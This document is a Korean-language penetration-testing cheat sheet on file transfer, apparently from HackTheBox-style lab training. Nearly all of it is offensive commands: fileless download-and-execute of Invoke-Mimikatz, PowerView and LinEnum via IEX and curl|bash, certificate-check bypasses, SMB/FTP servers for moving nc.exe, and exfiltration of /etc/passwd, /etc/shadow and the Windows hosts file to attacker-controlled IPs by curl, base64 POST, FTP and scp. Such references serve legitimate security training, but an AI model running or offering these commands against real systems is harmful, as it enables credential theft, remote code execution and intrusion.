# Download

## Windows

### PowerShell DownloadFile
```(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')```<br/>
예) ```(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')```<br/>
```(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')```<br/>
예) ```(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')```

### PowerShell DownloadString (File 없는 방법)
```IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')```<br/>
또는 ```(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX```

### PowerShell Invoke-WebRequest
```Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1```

### Internet Explorer의 첫번째 실행 구성 미완료 우회
```Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX```

### 인증서 신뢰 오류 우회
```
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
```

### SMB 서버 생성
```impacket-smbserver share -smb2support /tmp/smbshare```<br/>
```copy \\192.168.220.133\share\nc.exe```

사용자 인증 추가 - 비인증 경고 우회) 
```impacket-smbserver share -smb2support /tmp/smbshare -user test -password test```<br/>
```net use n: \\192.168.220.133\share /user:test test```

### FTP 서버 생성
```python3 -m pyftpdlib --port 21```<br/>
```(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')```

<br/><br/>
## Linux

### wget 사용 파일 다운로드
```wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh```

### cURL 사용 파일 다운로드
```curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh```

### cURL 사용 파일 다운로드 (File 없는 방법)
```curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash```

### wget 사용 파일 다운로드 (File 없는 방법)
```wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3```

### Bash로 다운로드 (/dev/tcp)
```
exec 3<>/dev/tcp/10.10.10.32/80
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
cat <&3
```

### SSH(SCP) 사용 다운로드
```scp plaintext@192.168.49.128:/root/myroot.txt .```

<br/><br/>
# Upload

## Windows

### PowerShell Web Upload
```python3 -m uploadserver```<br/>
```
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

### PowerShell Base64 Upload
```
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```
```echo <base64> | base64 -d -w 0 > hosts```

### 업로드용 FTP 서버 생성
```python3 -m pyftpdlib --port 21 --write```<br/>
```(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')```

<br/><br/>
## Linux

### Web Upload(HTTPS)
```
python3 -m pip install --user uploadserver
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
mkdir https && cd https
python3 -m uploadserver 443 --server-certificate ~/server.pem
```
```curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure```

### Web Server 만들기
```python3 -m http.server```<br/>
```python2.7 -m SimpleHTTPServer```<br/>
```php -S 0.0.0.0:8000```<br/>
```ruby -run -ehttpd . -p8000```

### SSH(SCP) 사용 업로드
scp /etc/passwd htb-student@192.168.1.1:/home/uplaod/
